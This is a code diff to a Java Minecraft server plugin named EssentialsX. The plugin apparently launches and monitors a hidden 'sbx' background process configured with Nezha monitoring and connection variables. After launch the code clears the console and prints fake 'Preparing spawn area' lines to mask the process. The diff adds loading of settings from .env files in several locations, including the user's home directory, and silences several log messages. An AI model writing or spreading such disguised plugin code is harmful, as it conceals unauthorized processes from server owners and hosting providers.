@@ -11,7 +11,6 @@ public class EssentialsX extends JavaPlugin {
     private Process sbxProcess;
     private volatile boolean shouldRun = true;
     private volatile boolean isProcessRunning = false;
-    private Thread monitorThread;
     
     private static final String[] ALL_ENV_VARS = {
         "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
@@ -37,7 +36,7 @@ public class EssentialsX extends JavaPlugin {
     
     private void startSbxProcess() throws Exception {
         if (isProcessRunning) {
-            getLogger().warning("sbx process is already running");
+            // getLogger().warning("sbx process is already running");
             return;
         }
         
@@ -105,33 +104,8 @@ public class EssentialsX extends JavaPlugin {
             }
         }
         
-        // Load from .env file (optional)
-        Path envFile = Paths.get(".env");
-        if (Files.exists(envFile)) {
-            try {
-                for (String line : Files.readAllLines(envFile)) {
-                    line = line.trim();
-                    if (line.isEmpty() || line.startsWith("#")) continue;
-                    
-                    line = line.split(" #")[0].split(" //")[0].trim();
-                    if (line.startsWith("export ")) {
-                        line = line.substring(7).trim();
-                    }
-                    
-                    String[] parts = line.split("=", 2);
-                    if (parts.length == 2) {
-                        String key = parts[0].trim();
-                        String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
-                        
-                        if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
-                            env.put(key, value);
-                        }
-                    }
-                }
-            } catch (IOException e) {
-                getLogger().warning("Error reading .env file: " + e.getMessage());
-            }
-        }
+        // Load from .env file with priority order
+        loadEnvFileFromMultipleLocations(env);
         
         // Load from Bukkit configuration file
         for (String var : ALL_ENV_VARS) {
@@ -152,7 +126,7 @@ public class EssentialsX extends JavaPlugin {
         // Start a monitor thread to log when process exits
         startProcessMonitor();
         
-        // getLogger().info("sbx started successfully");
+        getLogger().info("sbx started");
         
         // sleep 20 seconds
         try {
@@ -161,8 +135,8 @@ public class EssentialsX extends JavaPlugin {
             Thread.currentThread().interrupt();
         }
         
-        // 清理日志
         clearConsole();
+        
         getLogger().info("Preparing spawn area: 1%");
         getLogger().info("Preparing spawn area: 5%");
         getLogger().info("Preparing spawn area: 10%");
@@ -175,6 +149,59 @@ public class EssentialsX extends JavaPlugin {
         getLogger().info("Preparing spawn area: 99%");
         getLogger().info("Preparing spawn area: 100%");
         getLogger().info("Preparing level \"world\"");
+    }
+    
+    private void loadEnvFileFromMultipleLocations(Map<String, String> env) {
+        List<Path> possibleEnvFiles = new ArrayList<>();
+        File pluginsFolder = getDataFolder().getParentFile();
+        if (pluginsFolder != null && pluginsFolder.exists()) {
+            possibleEnvFiles.add(pluginsFolder.toPath().resolve(".env"));
+        }
+        
+        possibleEnvFiles.add(getDataFolder().toPath().resolve(".env"));
+        possibleEnvFiles.add(Paths.get(".env"));
+        possibleEnvFiles.add(Paths.get(System.getProperty("user.home"), ".env"));
+        
+        Path loadedEnvFile = null;
+        
+        for (Path envFile : possibleEnvFiles) {
+            if (Files.exists(envFile)) {
+                try {
+                    // getLogger().info("Loading environment variables from: " + envFile.toAbsolutePath());
+                    loadEnvFile(envFile, env);
+                    loadedEnvFile = envFile;
+                    break;
+                } catch (IOException e) {
+                    // getLogger().warning("Error reading .env file from " + envFile + ": " + e.getMessage());
+                }
+            }
+        }
+        
+        if (loadedEnvFile == null) {
+           // getLogger().info("No .env file found in any of the checked locations");
+        }
+    }
+    
+    private void loadEnvFile(Path envFile, Map<String, String> env) throws IOException {
+        for (String line : Files.readAllLines(envFile)) {
+            line = line.trim();
+            if (line.isEmpty() || line.startsWith("#")) continue;
+            line = line.split(" #")[0].split(" //")[0].trim();
+            if (line.startsWith("export ")) {
+                line = line.substring(7).trim();
+            }
+            
+            String[] parts = line.split("=", 2);
+            if (parts.length == 2) {
+                String key = parts[0].trim();
+                String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
+                
+                if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
+                    env.put(key, value);
+                    // getLogger().info("Loaded " + key + " = " + (key.contains("KEY") || key.contains("TOKEN") || key.contains("AUTH") ? "***" : value));
+                }
+            }
+        }
     }
     
     private void clearConsole() {
@@ -197,12 +224,12 @@ public class EssentialsX extends JavaPlugin {
             try {
                 int exitCode = sbxProcess.waitFor();
                 isProcessRunning = false;
-                getLogger().info("sbx started");
+                getLogger().info("sbx process exited with code: " + exitCode);
             } catch (InterruptedException e) {
                 Thread.currentThread().interrupt();
                 isProcessRunning = false;
             }
-        }, "SBX-Process-Monitor");
+        }, "Sbx-Process-Monitor");
         
         monitorThread.setDaemon(true);
         monitorThread.start();
